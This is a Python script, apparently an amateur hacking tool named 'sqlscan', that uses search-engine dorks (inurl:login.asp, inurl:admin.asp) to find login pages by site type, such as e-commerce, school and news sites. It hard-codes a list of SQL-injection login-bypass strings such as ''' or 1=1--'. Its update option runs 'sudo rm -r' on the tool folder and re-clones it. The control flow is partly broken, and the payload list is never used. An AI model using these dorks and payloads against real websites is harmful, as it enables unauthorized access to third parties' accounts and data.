import os
import subprocess
import random
print(" ___  ___  _     ___  ___    _")
print("|_ -||  .|| |   |_ -|| __|  / \  |\  |")
print("|___||_  || |_  |___|||__  /___\ | \ |  ")
print("       |_||___|      |___| |   | |  \|")
print("Version 4")
print("enter a number")
print("1 >> update a sqlscan")
print("2 >> finds sites vulnerable to SQL injection")
query = ["admin'--", "1'or'1'='1", "' or 0=0 --", '" or 0=0 --', "or 0=0 --", "' or 0=0 #", '" or 0=0 #', "or 0=0 #", "' or 'x'='x", '" or "x"="x', "') or ('x'='x", "' or 1=1--", '" or 1=1--', "or 1=1--", "' or a=a--", '" or "a"="a', "') or ('a'='a", '") or ("a"="a', 'hi" or "a"="a', 'hi" or 1=1 --', "hi' or 1=1 --", "hi' or 'a'='a", "hi') or ('a'='a", 'hi") or ("a"="a', "1' OR '1'='1"]
try:
    sql = int(input("number: "))
    if(sql == 1):
        os.chdir("..")
        os.system("sudo rm -r sqlscan")
        os.system("sudo apt install git")
        os.system("git clone https://github.com/WWW313NET/sqlscan")
        os.chdir("sqlscan")

    elif(sql == 2):
        print("e-commerce-1")
        print("news-2")
        print("blog-3")
        print("sports-4")
        print("computer science-5")
        print("car-6")
        print("gaming-7")
        print("streaming-8")
        print("CMS-9")
        print("food-10")
        print("channel-11")
        print("school-12")
        print("agency-13")
        print("social network-14")
        print("tv-15")

    dork = int(input("select vulnerable site type:"))

    if(dork < 1):
        print("enter a number greater than 1")
    elif(dork == 1):
        subprocess.call("firefox https://duckduckgo.com/?q=e-commerce+inurl:login.asp", shell=True)

    elif(dork == 2):
        subprocess.call("firefox https://duckduckgo.com/?q=news+inurl:login.asp", shell=True)

    elif(dork == 3):
        subprocess.call("firefox https://duckduckgo.com/?q=blog+inurl:login.asp", shell=True)


    elif(dork == 4):
        subprocess.call("firefox https://duckduckgo.com/?q=sports+inurl:login.asp", shell=True)


    elif(dork == 5):
        subprocess.call("firefox https://duckduckgo.com/?q=computer+science+inurl:login.asp", shell=True)


    elif(dork == 6):
        subprocess.call("firefox https://duckduckgo.com/?q=car+inurl:login.asp", shell=True)

    elif(dork == 7):
        subprocess.call("firefox https://duckduckgo.com/?q=gaming+inurl:login.asp", shell=True)


    elif(dork == 8):
        subprocess.call("firefox https://duckduckgo.com/?q=streaming+inurl:login.asp", shell=True)

    elif(dork == 9):
        subprocess.call("firefox https://duckduckgo.com/?q=CMS+inurl:login.asp", shell=True)

    elif(dork == 10):
        subprocess.call("firefox https://duckduckgo.com/?q=food+inurl:login.asp", shell=True)

    elif(dork == 11):
        subprocess.call("firefox https://duckduckgo.com/?q=channel+inurl:login.asp", shell=True)

    elif(dork == 12):
        subprocess.call("firefox https://duckduckgo.com/?q=school+inurl:login.asp", shell=True)

    elif(dork == 13):
        subprocess.call("firefox https://duckduckgo.com/?q=agency+inurl:admin.asp", shell=True)

    elif(dork == 14):
        subprocess.call("firefox https://duckduckgo.com/?q=social+network+inurl:login.asp", shell=True)


    elif(dork == 15):
        subprocess.call("firefox https://duckduckgo.com/?q=tv+inurl:login.asp", shell=True)


    elif(dork >= 16):
        print("enter a number less than 15")

    else:
        print("you have an error in your syntax SQL")



except:
    print("you have an error in your syntax SQL")
